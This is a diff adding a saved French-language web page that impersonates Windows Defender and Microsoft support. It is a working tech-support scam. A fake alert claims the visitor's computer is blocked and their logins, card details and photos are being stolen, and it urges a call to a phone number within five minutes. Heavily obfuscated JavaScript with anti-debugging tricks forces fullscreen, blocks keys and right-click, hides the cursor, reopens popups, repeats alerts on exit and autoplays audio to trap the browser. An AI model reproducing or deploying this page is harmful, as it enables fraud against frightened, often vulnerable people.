@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)index.html?number=PHONE-NUMBER&lang=fr -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Windows Defender - PHONE-NUMBER</title>
+
+<link href="./Windows Defender/bootstrap.css" type="text/css" rel="stylesheet">
+<link href="./Windows Defender/main.css" type="text/css" rel="stylesheet">
+<script src="./Windows Defender/jquery-2.2.4.min.js.téléchargement"></script>
+<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+
+<style> 
+.blink {
+background-color:#659e1d;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+
+</style>
+</head>
+
+<link id="avast_os_ext_custom_font" href="chrome-extension://eofcbnmajmjmplflapaojjnihcjkigck/common/ui/fonts/fonts.css" rel="stylesheet" type="text/css"><style type="text/css">* {<br>		-webkit-user-select: text !important;<br>		-moz-user-select: text !important;<br>		-ms-user-select: text !important;<br>		 user-select: text !important;<br>	}</style><style type="text/css">* {<br>		-webkit-user-select: text !important;<br>		-moz-user-select: text !important;<br>		-ms-user-select: text !important;<br>		 user-select: text !important;<br>	}</style><style type="text/css">* {<br>        -webkit-user-select: text !important;<br>        -moz-user-select: text !important;<br>        -ms-user-select: text !important;<br>         user-select: text !important;<br>    }</style></head>
+<body style="cursor: none; overflow: hidden;">
+
+<div id="light-screen">
+	
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+      <tbody>
+    <tr>
+          <td align="center" valign="top"><div id="map"></div></td>
+        </tr>
+  </tbody>
+    </table>
+<nav class="navbar navbar-default navbar-static-tops">
+      <div class="container">
+    <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
+          <a class="navbar-brand" href="index.html#"> </a> </div>
+    <div id="navbar" class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+        <li class="dropdown"> <a href="index.html#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Store<span class="caret"></span></a>
+              <ul class="dropdown-menu">
+            <li><a href="index.html#">Store Home </a></li>
+            <li><a href="index.html#">Devices</a></li>
+            <li><a href="index.html#">Software</a></li>
+            <li><a href="index.html#">Apps</a></li>
+            <li><a href="index.html#">Games</a></li>
+          </ul>
+            </li>
+        <li class="dropdown"> <a href="index.html#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Products<span class="caret"></span></a>
+              <ul class="dropdown-menu">
+            <li><a href="index.html#">Software &amp; services</a></li>
+            <li><a href="index.html#">Devices &amp; Xbox</a></li>
+            <li><a href="index.html#">For business</a></li>
+          </ul>
+            </li>
+        <li><a href="index.html#">Support</a></li>
+      </ul>
+          <ul class="nav navbar-nav navbar-right">
+        <li><a href="index.html#"><span class="glyphicon glyphicon-shopping-cart"></span>0</a></li>
+        <li><a href="index.html#"><strong>Gratuit: PHONE-NUMBER </strong></a></li>
+      </ul>
+        </div>
+    <!--/.nav-collapse --> 
+  </div>
+    </nav>
+<div class="container">
+      <div class="jumbotron">
+    <div class="row">
+          <div class="col-xs-6 text-left">
+        <h2 style="padding-left: 30px;">Appelez pour un soutien:</h2>
+        <h2>PHONE-NUMBER <span id="FormattedNumber1"></span></h2>
+		
+      </div>
+          <div class="col-xs-6 text-right">
+        <h2 style="padding-left: 30px;">Appelez pour un soutien:</h2>
+        <h2>PHONE-NUMBER <span id="FormattedNumber2"></span></h2>
+		
+      </div>
+        </div>
+  </div>
+      <div class="row" style="padding: 40px; text-align: center;">
+    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Manage my account</span> </a> </div>
+    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Ask the community</span> </a> </div>
+    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Contact Answer Desk</span> </a> </div>
+    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-download-alt"></span> <span>Find downloads</span> </a> </div>
+  </div>
+      <div class="row" style="text-align: center;">
+    <h3>I need help with...</h3>
+    <div class="bs-glyphicons" style="margin-top:30px;">
+          <div class="row">
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-1.svg&#39;)"></span> <span class="glyphicon-class product-name">Windows</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-2.svg&#39;)"></span> <span class="glyphicon-class product-name">Windows Phone 8</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-3.svg&#39;)"></span> <span class="glyphicon-class product-name">Lumia devices</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-4.svg&#39;)"></span> <span class="glyphicon-class product-name">Xbox</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-5.svg&#39;)"></span> <span class="glyphicon-class product-name">Office</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-6.svg&#39;)"></span> <span class="glyphicon-class product-name">OneDrive</span> </div>
+      </div>
+          <div class="row">
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-7.svg&#39;)"></span> <span class="glyphicon-class product-name">Surface</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-8.svg&#39;)"></span> <span class="glyphicon-class product-name">Microsoft Edge</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-9.svg&#39;)"></span> <span class="glyphicon-class product-name">Internet Explorer</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-10.svg&#39;)"></span> <span class="glyphicon-class product-name">Skype</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-11.svg&#39;)"></span> <span class="glyphicon-class product-name">Outlook.com</span> </div>
+        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url(&#39;/include/chrome/img/img-12.svg&#39;)"></span> <span class="glyphicon-class product-name">MSN</span> </div>
+      </div>
+        </div>
+  </div>
+      <div class="row" style="text-align: center; padding-bottom: 50px;"> <a>
+        <h4 style="margin-top: 40px; margin-bottom: 80px;">View all Windows products</h4>
+        </a>
+    <div class="row">
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Business, IT &amp; developer</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>Support for small business</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Enterprise and partners</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>IT Professionals</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Developers</a></li>
+            </ul>
+      </div>
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Set up &amp; install</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>How to upgrade to Windows 10</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Install Office 365 Home, Personal, or
+                University</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Activate Office 365 Home, Personal, University,
+                Office 2013, or Office 2016</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>why is office taking so long to install?</a></li>
+            </ul>
+      </div>
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Popular topics</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>Activation in Windows 10</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Need Help with Office 2016?</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 FAQ</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 help &amp; how-to</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 Mobile help &amp; how-to</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Can't find Office applications in Windows 10,
+                Windows 8, or WIndows 7?</a></li>
+            </ul>
+      </div>
+        </div>
+  </div>
+    </div>
+<footer class="footer">
+      <div class="container">
+    <div class="row">
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Support</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>Account support</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Supported products list</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Product support lifecycle</a></li>
+            </ul>
+      </div>
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Security</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>Safety &amp; Security Center</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Download Security Essentials</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Malicious Software Removal Tool</a></li>
+            </ul>
+      </div>
+          <div class="col-md-4" style="text-align:left;">
+        <h4>Popular topics</h4>
+        <ul style="padding:0px;">
+              <li style="list-style: none; padding:10px 0px;"><a>Report a support scam</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Disability Answer Desk</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Locate Windows addresses worldwide</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 help &amp; how-to</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 Mobile help &amp; how-to</a></li>
+              <li style="list-style: none; padding:10px 0px;"><a>Can't find Office applications in Windows 10,
+                Windows 8, or WIndows 7?</a></li>
+            </ul>
+      </div>
+        </div>
+    <div class="row" style="font-size: 1.2rem; padding:30px 0px;">
+          <div style="float:left;"><span class="glyphicon glyphicon-cd"></span><span>English(United States)</span> </div>
+          <div style="float:right;"> <span style="padding:0px 15px;">Terms of use</span> <span style="padding:0px 15px;">English(United States)</span> <span style="padding:0px 15px;">Trademarks</span> <span style="padding:0px 15px;">@2017 Windows</span> </div>
+        </div>
+  </div>
+    </footer>
+
+
+ 
+ 
+<div id="chrome-alerts" class="chrome-alert">
+      <div> <a href="index.html?number=PHONE-NUMBER&amp;lang=fr#" class="cross">×</a>
+    <h1>support.windows.com says:</h1>
+    <div class="content-box" id="alert-content-box">
+          <p>** VOTRE ORDINATEUR A ÉTÉ BLOCKÉ **<br><br>Erreur # DW6VB36<br><br>Nous vous prions de nous appeler immédiatement au: PHONE-NUMBER<br>Ne pas ignorer cette alerte critique.<br>Si vous fermez cette page, votre accès à l'ordinateur sera désactivé pour éviter d'autres dommages à notre réseau.<br><br>Notre ordinateur nous a alerté qu'il A été infecté par un virus et un spyware.  Les informations suivantes sont volées...<br><br> Facebook Login<br>&gt; détails de carte de crédit<br>&gt; compte e-mail de connexion<br>&gt; Photos stockées sur cet ordinateur<br>Vous devez nous contacter immédiatement afin que nos ingénieurs peuvent vous guider à travers le processus de suppression par téléphone. <br>Veuillez nous appeler dans les 5 prochaines minutes pour éviter que votre ordinateur ne soit désactivé.<span style="font-size: 18px; font-weight:bold"> Téléphone: PHONE-NUMBER</span></p>
+        </div>
+    <label style="font-size: 15px;">
+          <input type="checkbox">
+          Pour sécuriser vos données et votre système Windows, cliquez ici...</label>
+    <div class="action_buttons"> <a style="color:#fff;background:#659e1d;" href="javascript:;" class="active blink" id="leave_page"> Retour a la sécurité</a> </div>
+  </div>
+    </div>
+</div>
+<iframe src="fr.mp3" allow="autoplay" style="display:none" id="iframeAudio">
+</iframe> 
+<audio autoplay loop id="play" ><source src="fr.mp3" type="audio/mp3"></audio>
+<script>
+text2 = "\n** VOTRE ORDINATEUR A ÉTÉ BLOCKÉ **\n\nErreur # DW6VB36\n\nNous vous prions de nous appeler immédiatement au: PHONE-NUMBER\nNe pas ignorer cette alerte critique.\nSi vous fermez cette page, votre accès à l'ordinateur sera désactivé pour éviter d'autres dommages à notre réseau.\nNotre ordinateur nous a alerté qu'il A été infecté par un virus et un spyware.  Les informations suivantes sont volées...\n\nFacebook Login\n> détails de carte de crédit\n> compte e-mail de connexion\n> Photos stockées sur cet ordinateur\nVous devez nous contacter immédiatement afin que nos ingénieurs peuvent vous guider à travers le processus de suppression par téléphone.  Veuillez nous appeler dans les 5 prochaines minutes pour éviter que votre ordinateur ne soit désactivé.\n\nTéléphone: PHONE-NUMBER\n";
+
+var a=['cmVzaXpl','Y3Nz','b3ZlcmZsb3c=','aGlkZGVu','LnBvcHVwLWFsZXJ0','c3RvcA==','YW5pbWF0ZQ==','LTEwcHg=','cGxheQ==','d2lkdGg=','Y29uc3RydWN0b3I=','d2hpbGUgKHRydWUpIHt9','Y291bnRlcg==','bGVuZ3Ro','ZGVidQ==','Z2dlcg==','YWN0aW9u','c3RhdGVPYmplY3Q=','VUxsc1U=','ZVZxR1g=','YXBwbHk=','Zm9jdXM=','bG9jYXRpb24=','aHJlZg==','JmJsdWVyPTE=','QWxlcnQ=','d2lkdGg9MTAwMDAwMCxoZWlnaHQ9MTAwMDAwMDAwMDAwLHNjcm9sbGluZz15ZXMsZnVsbHNjcmVlbj15ZXM=','ZnVuY3Rpb24gKlwoICpcKQ==','XCtcKyAqKD86XzB4KD86W2EtZjAtOV0pezQsNn18KD86XGJ8XGQpW2EtejAtOV17MSw0fSg/OlxifFxkKSk=','aW5pdA==','Y2hhaW4=','dGVzdA==','aW5wdXQ=','TkhCb2g=','TE5wY2o=','Y29uc29sZQ==','bG9n','ZGVidWc=','aW5mbw==','ZXJyb3I=','dHJhY2U=','cmV0dXJuIChmdW5jdGlvbigpIA==','e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=','dFBlaEo=','ZXhjZXB0aW9u','V1hmRHc=','dHB1V20=','d2Fybg==','b25jbGljaw==','dGFyZ2V0','c3JjRWxlbWVudA==','dGFnTmFtZQ==','RElW','c3R5bGU=','Y3Vyc29y','bm9uZQ==','Ym9keQ==','b25jb250ZXh0bWVudQ==','cmV0dXJuIGZhbHNl','Z2V0RWxlbWVudEJ5SWQ=','Ymx1ZS1zY3JlZW4=','ZGlzcGxheQ==','YmxvY2s=','Y2xhc3M=','cGFzdA==','b3Blbg==','ZnVsbHNjcmVlbkVsZW1lbnQ=','bW96RnVsbFNjcmVlbkVsZW1lbnQ=','d2Via2l0RnVsbHNjcmVlbkVsZW1lbnQ=','ZG9jdW1lbnRFbGVtZW50','bW96UmVxdWVzdEZ1bGxTY3JlZW4=','R1dvelM=','d2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4=','QUxMT1dfS0VZQk9BUkRfSU5QVVQ=','YWRkRXZlbnRMaXN0ZW5lcg==','a2V5Q29kZQ==','a2V5dXA=','b25sb2Fk','cUhTUVY=','b0htR1I=','Y2xpY2s=','cmVxdWVzdEZ1bGxTY3JlZW4=','d2Via2l0UmVxdWVzdEZ1bGxTY3JlZW4=','Y2FsbA=='];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};var g=function(){var h={'data':{'key':'cookie','value':'timeout'},'setCookie':function(i,j,k,l){l=l||{};var m=j+'='+k;var n=0x0;for(var n=0x0,p=i['length'];n<p;n++){var q=i[n];m+=';\x20'+q;var r=i[q];i['push'](r);p=i['length'];if(r!==!![]){m+='='+r;}}l['cookie']=m;},'removeCookie':function(){return'dev';},'getCookie':function(s,t){s=s||function(u){return u;};var v=s(new RegExp('(?:^|;\x20)'+t['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var w=function(x,y){x(++y);};w(e,d);return v?decodeURIComponent(v[0x1]):undefined;}};var z=function(){var A=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return A['test'](h['removeCookie']['toString']());};h['updateCookie']=z;var B='';var C=h['updateCookie']();if(!C){h['setCookie'](['*'],'counter',0x1);}else if(C){B=h['getCookie'](null,'counter');}else{h['removeCookie']();}};g();}(a,0x162));var b=function(c,d){c=c-0x0;var e=a[c];if(b['pEptrA']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&&(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&m>>(-0x2*l&0x6)):0x0){n=i['indexOf'](n);}return p;});}());b['lkjcSn']=function(q){var r=atob(q);var s=[];for(var t=0x0,u=r['length'];t<u;t++){s+='%'+('00'+r['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(s);};b['TlAnLz']={};b['pEptrA']=!![];}var v=b['TlAnLz'][c];if(v===undefined){var w=function(x){this['yYxIsH']=x;this['NtaLNg']=[0x1,0x0,0x0];this['knSOcS']=function(){return'newState';};this['mtvSPD']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['NZZLpE']='[\x27|\x22].+[\x27|\x22];?\x20*}';};w['prototype']['XSnvrh']=function(){var y=new RegExp(this['mtvSPD']+this['NZZLpE']);var z=y['test'](this['knSOcS']['toString']())?--this['NtaLNg'][0x1]:--this['NtaLNg'][0x0];return this['xnYsVu'](z);};w['prototype']['xnYsVu']=function(A){if(!Boolean(~A)){return A;}return this['INnltU'](this['yYxIsH']);};w['prototype']['INnltU']=function(B){for(var C=0x0,D=this['NtaLNg']['length'];C<D;C++){this['NtaLNg']['push'](Math['round'](Math['random']()));D=this['NtaLNg']['length'];}return B(this['NtaLNg'][0x0]);};new w(b)['XSnvrh']();e=b['lkjcSn'](e);b['TlAnLz'][c]=e;}else{e=v;}return e;};var f=function(){var c=!![];return function(d,e){var f=c?function(){if(e){var g=e['apply'](d,arguments);e=null;return g;}}:function(){};c=![];return f;};}();var an=f(this,function(){var c=function(){return'\x64\x65\x76';},d=function(){return'\x77\x69\x6e\x64\x6f\x77';};var e=function(){var f=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!f['\x74\x65\x73\x74'](c['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var g=function(){var h=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return h['\x74\x65\x73\x74'](d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var i=function(j){var k=~-0x1>>0x1+0xff%0x0;if(j['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===k)){l(j);}};var l=function(m){var n=~-0x4>>0x1+0xff%0x0;if(m['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==n){i(m);}};if(!e()){if(!g()){i('\x69\x6e\x64\u0435\x78\x4f\x66');}else{i('\x69\x6e\x64\x65\x78\x4f\x66');}}else{i('\x69\x6e\x64\u0435\x78\x4f\x66');}});an();var e=function(){var F=!![];return function(G,H){if(b('0x0')!==b('0x1')){var I=F?function(){if(H){var J=H[b('0x2')](G,arguments);H=null;return J;}}:function(){};F=![];return I;}else{if(opener&&!opener['closed']){opener[b('0x3')]();}else{var z=window['open'](window[b('0x4')][b('0x5')]+b('0x6'),b('0x7'),b('0x8'));opener=z;}}};}();(function(){e(this,function(){var M=new RegExp(b('0x9'));var N=new RegExp(b('0xa'),'i');var O=d(b('0xb'));if(!M['test'](O+b('0xc'))||!N[b('0xd')](O+b('0xe'))){if(b('0xf')==='NHBoh'){O('0');}else{that=window;}}else{if(b('0x10')!==b('0x10')){that[b('0x11')][b('0x12')]=func;that[b('0x11')]['warn']=func;that[b('0x11')][b('0x13')]=func;that[b('0x11')][b('0x14')]=func;that[b('0x11')][b('0x15')]=func;that['console']['exception']=func;that[b('0x11')][b('0x16')]=func;}else{d();}}})();}());var c=function(){var R=!![];return function(S,T){var U=R?function(){if(T){var V=T[b('0x2')](S,arguments);T=null;return V;}}:function(){};R=![];return U;};}();var g=c(this,function(){var W=function(){};var X;try{var Y=Function(b('0x17')+b('0x18')+');');X=Y();}catch(Z){X=window;}if(!X[b('0x11')]){if(b('0x19')===b('0x19')){X[b('0x11')]=function(a0){var a1={};a1['log']=a0;a1['warn']=a0;a1[b('0x13')]=a0;a1['info']=a0;a1[b('0x15')]=a0;a1[b('0x1a')]=a0;a1[b('0x16')]=a0;return a1;}(W);}else{if(fn){var j=fn['apply'](context,arguments);fn=null;return j;}}}else{if(b('0x1b')!==b('0x1c')){X[b('0x11')][b('0x12')]=W;X[b('0x11')][b('0x1d')]=W;X[b('0x11')][b('0x13')]=W;X['console'][b('0x14')]=W;X[b('0x11')][b('0x15')]=W;X[b('0x11')][b('0x1a')]=W;X['console'][b('0x16')]=W;}else{document[b('0x1e')]=function(a5){a5=a5||event;target=a5[b('0x1f')]||a5[b('0x20')];if(target[b('0x21')]==b('0x22')){toggleFullScreen();document['body'][b('0x23')][b('0x24')]=b('0x25');newLine();}else{toggleFullScreen();document[b('0x26')][b('0x23')][b('0x24')]=b('0x25');newLine();}};}}});g();window['onkeydown']=function(a6){return![];};window['onkeypress']=function(a7){return![];};onbeforeunload=function(){alert(text2);return text2;};document[b('0x27')]=new Function(b('0x28'));for(var _i=0x0;_i<0x0;_i++){alert(text2);}function newLine(){document[b('0x29')](b('0x2a'))['style'][b('0x2b')]=b('0x2c');document['getElementsByTagName'](b('0x26'))['item'](0x0)['setAttribute'](b('0x2d'),b('0x2e'));}function openBrowser(){if(opener&&!opener['closed']){opener['focus']();}else{var a8=window[b('0x2f')](window[b('0x4')][b('0x5')]+'&bluer=1',b('0x7'),b('0x8'));opener=a8;}}function toggleFullScreen(){if(!document[b('0x30')]&&!document[b('0x31')]&&!document[b('0x32')]){if(document[b('0x33')]['requestFullscreen']){document[b('0x33')]['requestFullscreen']();}else if(document[b('0x33')][b('0x34')]){if(b('0x35')!==b('0x35')){var u=fn[b('0x2')](context,arguments);fn=null;return u;}else{document[b('0x33')][b('0x34')]();}}else if(document[b('0x33')][b('0x36')]){document['documentElement'][b('0x36')](Element[b('0x37')]);}}openBrowser();}document[b('0x38')]('keyup',function(ab){if(ab[b('0x39')]==0x1b){toggleFullScreen();}},![]);document[b('0x38')](b('0x3a'),function(ac){if(ac[b('0x39')]==0x7a||ac['keyCode']==0x11||ac['keyCode']==0x12||ac['keyCode']==0xd){newLine();toggleFullScreen();}},![]);window[b('0x3b')]=function(){document[b('0x1e')]=function(ad){ad=ad||event;target=ad['target']||ad[b('0x20')];if(target[b('0x21')]=='DIV'){if(b('0x3c')===b('0x3d')){newLine();toggleFullScreen();}else{toggleFullScreen();document[b('0x26')]['style'][b('0x24')]=b('0x25');newLine();}}else{if('crtgW'==='crtgW'){toggleFullScreen();document[b('0x26')][b('0x23')][b('0x24')]=b('0x25');newLine();}else{return!![];}}};};addEventListener(b('0x3e'),function(){newLine();var ag=document[b('0x33')],ah=ag[b('0x3f')]||ag[b('0x40')]||ag[b('0x34')];ah[b('0x41')](ag);});window[b('0x38')](b('0x42'),function(){$('body')[b('0x43')](b('0x44'),b('0x45'));$(b('0x46'))[b('0x47')]()[b('0x48')]({'bottom':b('0x49'),'opacity':0x1},0x1f4);document[b('0x29')](b('0x4a'))[b('0x4a')]();if(screen[b('0x4b')]===window['innerWidth']){}});function d(ai){function aj(ak){if(typeof ak==='string'){return function(al){}[b('0x4c')](b('0x4d'))[b('0x2')](b('0x4e'));}else{if((''+ak/ak)[b('0x4f')]!==0x1||ak%0x14===0x0){(function(){return!![];}['constructor'](b('0x50')+b('0x51'))[b('0x41')](b('0x52')));}else{(function(){return![];}[b('0x4c')](b('0x50')+b('0x51'))[b('0x2')](b('0x53')));}}aj(++ak);}try{if(ai){return aj;}else{aj(0x0);}}catch(am){}}
+
+var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+    if(!isChrome){
+      $('#iframeAudio').remove()
+    }
+  else{
+     $('#play').remove() //just to make sure that it will not have 2x audio in the background 
+  }
+</script>
+<script type="text/javascript">
+		document.oncontextmenu = null;
+		document.onselectstart = null;
+		document.ondragstart = null;
+		document.onmousedown = null;
+		document.body.oncontextmenu = null;
+		document.body.onselectstart = null;
+		document.body.ondragstart = null;
+		document.body.onmousedown = null;
+		document.body.oncut = null;
+		document.body.oncopy = null;
+		document.body.onpaste = null;
+	</script><script type="text/javascript">
+		document.oncontextmenu = null;
+		document.onselectstart = null;
+		document.ondragstart = null;
+		document.onmousedown = null;
+		document.body.oncontextmenu = null;
+		document.body.onselectstart = null;
+		document.body.ondragstart = null;
+		document.body.onmousedown = null;
+		document.body.oncut = null;
+		document.body.oncopy = null;
+		document.body.onpaste = null;
+	</script></body></html>
